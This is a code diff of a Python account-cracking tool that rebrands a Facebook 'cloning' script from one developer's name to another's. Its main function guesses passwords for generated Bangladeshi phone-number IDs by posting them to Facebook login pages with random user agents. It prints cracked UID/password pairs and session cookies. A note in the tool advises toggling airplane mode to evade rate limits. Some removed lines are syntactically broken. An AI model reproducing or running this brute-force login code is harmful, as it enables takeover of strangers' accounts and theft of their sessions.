@@ -1,4 +1,4 @@
-import time, os, json, sys, re, string, random
+import time,os,json,sys,re,string, random 
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 
 
@@ -65,28 +65,24 @@ def clear():
 def logo():
     clear()
     print("""
-                                                                                                                                                                                                                                                                                                          
-    /|    / /                                           
-   //|   / /      ___        __        ___       / ___  
-  // |  / /     //   ) )   //  ) )   //   ) )   //\ \   
- //  | / /     //   / /   //        //   / /   //  \ \  
-//   |/ /     ((___/ /   //        ((___/ /   //    \ \ 
-                                                                                                   
-       1.1
+   _ __ ___  ___   _   _  __
+  /// // _/ / o |,' \ / |/ /
+ / ` // _/ /  ,'/ o |/ || / 
+/_n_//___//_/`_\|_,'/_/|_/       0.1
     """)
     
 def space():
     print("\n")
 
 
-number=int("+8801814092702")
+number=int("+8801944981090")
 
 devoloper_info={
-    "Developer" :  'NOROK VAU',
+    "Developer" :  'HERON AFRIDI',
     "Number" :  number,
-    "Status" :  '24-OFFLINE😳',
-    "GitHub Url":  'https://github.com/Norokfj',
-    "Facebook" :  'facebook.com/Norok Vau',
+    "Status" :  '24-ONLINE',
+    "GitHub Url":  'https://github.com/TEAM-ELITE1',
+    "Facebook" :  'facebook.com/Freestyle.0fficial',
     }
 
 date={
@@ -94,10 +90,10 @@ date={
     "Month":month,
  }
 mj=Tree("[bold purple]![[bold red]A[bold purple]] ")
-mj.add("[cyan][bold]RANDOM CLONEING ").add("[bold green][FIRE]")
+mj.add("[cyan][bold]RANDOM CLONEING ").add("[bold green][GOOD]")
 
 mx=Tree("[bold purple]![[bold red]B[bold purple]] ")
-mx.add("[bold yellow]FILE CLONEING").add("[bold green][GREAT]")
+mx.add("[bold yellow]FILE CLONEING").add("[bold green][GREAT]")
 
 my=Tree("[bold purple]![[bold red]C[bold purple]] ")
 my.add("[tan][bold]REPORT BUG ")
@@ -124,27 +120,11 @@ for x in range(1000):
     uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
     ugen.append(uaku2)
 
-for agent in range(1000):
-    aa='Mozilla/5.0 (Linux; Android 12;'
-    b=random.choice(['7.0','8.1.0','9','10','11','12'])
-    c=random.choice(['Samsung S23 Ultra'])
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    e=random.randrange(1, 999)
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko)'
-    h=random.randrange(80,103)
-    i='0'
-    j=random.randrange(4200,4900)
-    k=random.randrange(40,150)
-    l='Chrome/99.0.4844.58 Mobile Safari/537.36'
-    fullagnt=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-    ugen.append(fullagnt)
 
-
-note1="""- __Inbox__ Me for Join `FCS`\n- Try tool and **Review**"""
+note1="""- __Inbox__ Me for Join `Team Elite`\n- Try tool and **Review**"""
 n1=Markdown(note1)
 
-note2="""#  __NOROK RANDOM CLONEING TASK BOX__\n- Choice BD code \n- And Put Limit"""
+note2="""#  __RANDOM CLONEING TASK BOX__\n- Choice BD code \n- And Put Limit"""
 n2=Markdown(note2)
 
 note3="""- __System__ Starting Bro Wait\n- Follow our **FB Group**\n- Inbox Me For Anything"""
@@ -152,9 +132,6 @@ n3=Markdown(note3)
 
 note4="""- Use Airplane mode in every 3 minutes \n- Use APN For Get More Ok ID \n- Cracking Started """
 n4=Markdown(note4)
-
-note5="""- Join My Public Group And Enjoy My Tool"""
-n5=Markdown(note5)
 
 nv = Padding("TOOL MENU", style="on green", expand=False)
 cxx = Padding("DONE",(1,2), style="on green", expand=False)
@@ -200,7 +177,7 @@ def main():
     print_json(data=devoloper_info)
     print(Panel(n1,title="[bold red]NOTE"))
     space()
-    #dual("Hello bro,I am Norok,I am an artificial intelligent,and welcome to our tool","y.mp3")
+    #dual("Hello bro,I am Zara,I am an artificial intelligent,and welcome to our tool","y.mp3")
     
     print(nv)
     space()
@@ -221,12 +198,12 @@ def numb():
     
     print(n2)
     space()
-    print("    [bold red]CODE               [bold yellow] ✓ [bold green]Example {017}={019}={016}")
+    print("    [bold red]CODE               [bold yellow] ✓ [bold green]Example 017, 019, 016, ")
     code=input("                        ✓ Choice ->")
     print("                      [bold yellow]  ✓ [bold green]You Choosed "+code)
     space()
     space()
-    print("    [bold red]LIMIT              [bold yellow] ✓ [bold green]Example 10000,20000,30000") 
+    print("    [bold red]LIMIT              [bold yellow] ✓ [bold green]Example 1000,2000,3000") 
     limit=int(input("                        ✓ Choice ->"))
     print("                      [yellow] [bold] ✓[bold green] Crack Limit ",limit)
     print(cxx)
@@ -264,10 +241,6 @@ def numb():
         Mathi6.add("TOUCH. FACEBOOK ")
         print(Mathi6)
         space()
-        Mathi7=Tree("[bold green][G/7]")
-        Mathi7.add("BUSINESS. FACEBOOK ")
-        print(Mathi7)
-        space()
         jbs=input("                [✓] choice:")
         if jbs in ["1","A","a","01"]:
             tsg="m"
@@ -281,8 +254,6 @@ def numb():
             tsg="free"
         elif jbs in ["6","F","f","06"]:
             tsg="touch"
-        elif jbs in ["7","G","g","07"]:
-             tsg="business"
         else:
             tsg="m"
         logo()
@@ -294,8 +265,6 @@ def numb():
         
         space()
         print(n4)
-        space()
-        print(n5)
         space()
         print_json(data=date)
         space()
@@ -322,30 +291,15 @@ def numb():
 def need(uid,pwx,fb,tl):
     global ok,ugen,loop
     session=requests.session()
-    sys.stdout.write(f"\r  \33[1;90m[\33[1;97m[Norok-✘D]\33[1;92m | {'{:.1%}'.format(loop/int(tl))} | \33[1;97m{loop} \33[1;90m] \r "),
+    sys.stdout.write(f"\r  \33[1;90m[\33[1;97m✘D\33[1;92m | {'{:.1%}'.format(loop/int(tl))} | \33[1;97m{loop} \33[1;90m] \r "),
     sys.stdout.flush()
     try:
         for ps in pwx:
             uuu=random.choice(ugen)
             free_fb = session.get(f'https://{fb}.facebook.com').text
             info={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
-            update= {"
-                                'authority': 'web.facebook.com',
-                                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                                'accept-language': 'en-US,en;q=0.9',
-                                'cache-control': 'max-age=0',
-                                'dpr': '2',
-                                'sec-ch-ua': '"Google Chrome";v="112", "Chromium";v="112", "Not=A?Brand";v="24"',
-                                'sec-ch-ua-mobile': '?0',
-                                'sec-ch-ua-platform': '"Windows"',
-                                'sec-fetch-dest': 'document',
-                                'sec-fetch-mode': 'navigate',
-                                'sec-fetch-site': 'same-origin',
-                                'sec-fetch-user': '?1',
-                                'upgrade-insecure-requests': '1',
-                                'user-agent':
-                                'viewport-width': '980',}
-                    session.post(url=f"https://web.facebook.com/?_rdc=1&_rdr",cookies=cookies, headers=update).text
+            update= {"authority": f'{fb}.facebook.com',"method": 'POST',"scheme": 'https',"accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',"accept-encoding": 'gzip, deflate, br',"accept-language": 'en-US,en;q=1',"cache-control": 'no-cache, no-store, must-revalidate',"referer": f'https://{fb}.facebook.com/',"sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',"sec-ch-ua-mobile": '?0',"sec-ch-ua-platform": "Windows","sec-fetch-dest": 'document',"sec-fetch-mode": 'navigate',"sec-fetch-site": 'same-origin',"sec-fetch-user": '?1',"pragma": 'no-cache',"priority": 'u=1',"cross-origin-resource-policy": 'cross-origin',"upgrade-insecure-requests": '1',"user-agent": uuu,}
+            session.post(url=f"https://{fb}.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",data=info,headers=update).text
             heron_brand=session.cookies.get_dict().keys()
             if "c_user" in heron_brand:
                 hh=str(len(ok))
@@ -353,7 +307,7 @@ def need(uid,pwx,fb,tl):
                 xx=coki.split("c_user=")[1]
                 xd=xx[:15]
                 print("\r\r\n\n")
-                print(Panel(f"\r\r\n[white reverse][🥳]=UID/PAS[/white reverse] [bold green]{xd} [cyan]• [black reverse]{ps}[/black reverse] \n[yellow reverse]COOKIES=[🔶][/yellow reverse][bold green]{coki}\n",title=f"[red reverse][TOTAL-OK {hh}]"))
+                print(Panel(f"\r\r\n[white reverse][🔷]=UID/PAS[/white reverse] [bold green]{xd} [cyan]• [black reverse]{ps}[/black reverse] \n[yellow reverse]COOKIES=[🔶][/yellow reverse][bold green]{coki}\n",title=f"[red reverse][TOTAL-OK {hh}]"))
                 ok.append(uid)
                 break
             
@@ -362,25 +316,5 @@ def need(uid,pwx,fb,tl):
         loop+=1
     except:
         time.sleep(15)
-
-
-def apvdef():
-    a=str(os.geteuid())
-    b=str(os.getlogin())
-    key= "\"`\'''.join(a+b)
-      row=httpx.get("https://github.com/Norokfj/Dadu/blob/main/Approval.txt").text
-      if key in row:
-        main()
-      else:
-          os.system("clear")
-          print(logo)
-          print(" your key is not approved")
-          print(" please approve your key on paid")
-          print(" Your key :"+key)
-          os.system("termux-open https://m.me/j/AbZeFrZPlnaNPrDi/")
-          sys.exit()
-          
-        
-
 
 main()
